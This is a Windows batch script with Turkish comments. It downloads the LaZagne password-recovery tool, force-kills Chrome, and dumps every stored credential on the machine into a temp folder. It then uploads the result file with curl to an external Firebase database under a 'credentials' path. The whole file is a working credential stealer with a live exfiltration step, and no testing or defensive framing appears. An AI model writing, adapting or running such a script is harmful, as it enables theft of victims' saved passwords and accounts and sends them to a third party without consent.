@echo off
setlocal enabledelayedexpansion

:: Ayarlar
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_BASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: Lazagne.exe yoksa indir
if not exist "%LAZ_EXE%" (
    echo [INFO] Lazagne.exe bulunamadi, indiriliyor...
    powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
    if errorlevel 1 (
        echo [ERROR] Lazagne indirilemedi!
        pause
        exit /b 1
    )
    echo [OK] Lazagne indirildi.
) else (
    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
)

:: Chrome varsa kapat
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if errorlevel 1 (
    echo [INFO] Chrome acik degil.
) else (
    echo [INFO] Chrome calisiyor, kapatiliyor...
    taskkill /IM chrome.exe /F >nul 2>&1
    if errorlevel 1 (
        echo [WARN] Chrome kapatilamadi.
    ) else (
        echo [OK] Chrome kapatildi.
    )
)

:: Sonuç klasörünü oluştur
if not exist "%RESULT_DIR%" (
    mkdir "%RESULT_DIR%"
    if errorlevel 1 (
        echo [ERROR] Sonuc klasoru olusturulamadi!
        pause
        exit /b 1
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR%

:: Kod sayfasını UTF-8 olarak ayarla
chcp 65001 >nul

:: LaZagne ile tüm credential’ları topla
if not exist "%LAZ_EXE%" (
    echo [ERROR] Lazagne.exe bulunamadi!
    pause
    exit /b 1
)
echo [INFO] LaZagne calistiriliyor...
echo Running: "%LAZ_EXE%" all -oN -output "%RESULT_DIR%"
"%LAZ_EXE%" all -oN -output "%RESULT_DIR%" >nul 2>&1
if errorlevel 1 (
    echo [ERROR] LaZagne calistirilirken hata olustu.
) else (
    echo [OK] LaZagne calistirildi.
)

:: En son oluşturulan .txt dosyasını bul
set "RESULT_FILE="
for /f "delims=" %%i in ('dir "%RESULT_DIR%\*.txt" /b /od 2^>nul') do (
    set "RESULT_FILE=%%i"
)
if not defined RESULT_FILE (
    echo [ERROR] Sonuc dosyasi bulunamadi!
    pause
    exit /b 1
)
echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE!

:: Zaman damgası oluştur (örnek: 20250614_192345)
set "TIMESTAMP=%DATE:~-4%%DATE:~3,2%%DATE:~0,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%"
set "TIMESTAMP=!TIMESTAMP: =0!"
echo [DEBUG] TIMESTAMP: !TIMESTAMP!

:: Firebase URL'yi hazırla
set "FIREBASE_URL=%FIREBASE_BASE_URL%/uploads/!TIMESTAMP!"
echo [DEBUG] Firebase URL: %FIREBASE_URL%.json

:: Sonuçları Firebase'e yükle (curl ile)
echo [INFO] Sonuclar Firebase'e yukleniyor...
set "FULL_PATH=%RESULT_DIR%\!RESULT_FILE!"
curl.exe -X PUT -d @"%FULL_PATH%" "%FIREBASE_URL%.json" --silent --show-error
if errorlevel 1 (
    echo [ERROR] !RESULT_FILE! yuklenemedi!
    pause
    exit /b 1
) else (
    echo [OK] !RESULT_FILE! yuklendi.
)

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo ------------------------------------------------------------
echo Cikmak icin bir tusa basin...
pause >nul
exit /b 0
